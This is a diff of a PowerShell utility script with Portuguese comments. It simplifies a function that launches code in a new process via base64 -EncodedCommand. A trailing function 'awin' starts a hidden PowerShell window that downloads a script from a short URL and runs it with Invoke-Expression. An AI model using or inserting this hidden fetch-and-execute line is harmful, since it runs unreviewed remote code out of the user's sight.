@@ -2358,8 +2358,7 @@ function NEWPWSH {
     param(
         [Parameter(Mandatory = $true)]
         [string[]]$FunctionNames,
-        [switch]$Wait,
-        [switch]$ReturnProcess
+        [switch]$Wait
     )
     
     # Combina as definições das funções (preservando a ordem)
@@ -2368,23 +2367,22 @@ function NEWPWSH {
     } -join "`n"
     
     # Converte o conteúdo para Base64 para uso com -EncodedCommand
-    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($combinedDefinitions))
+    $encodedCommand = [Convert]::ToBase64String(
+        [Text.Encoding]::Unicode.GetBytes($combinedDefinitions)
+    )
     $arguments = @('-noprofile', '-EncodedCommand', $encodedCommand)
     
     if ($Wait) {
-        # Caso Wait seja especificado, aguardamos o término do processo internamente.
+        # Se o parâmetro Wait for fornecido, espera o término do processo
         [void](Start-Process powershell -ArgumentList $arguments -Wait)
     }
-    elseif ($ReturnProcess) {
-        # Se o usuário quer o objeto do processo para controlar externamente, retornamos-o.
+    else {
+        # Caso contrário, capturo e retorno o objeto do processo para uso externo
         $proc = Start-Process powershell -ArgumentList $arguments -PassThru
         return $proc
     }
-    else {
-        # Se nada for especificado, usamos a forma que não retorna nada – compatível com [void](...)
-        [void](Start-Process powershell -ArgumentList $arguments)
-    }
 }
+
 
 function awin {
     Start-Process powershell -WindowStyle Hidden { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
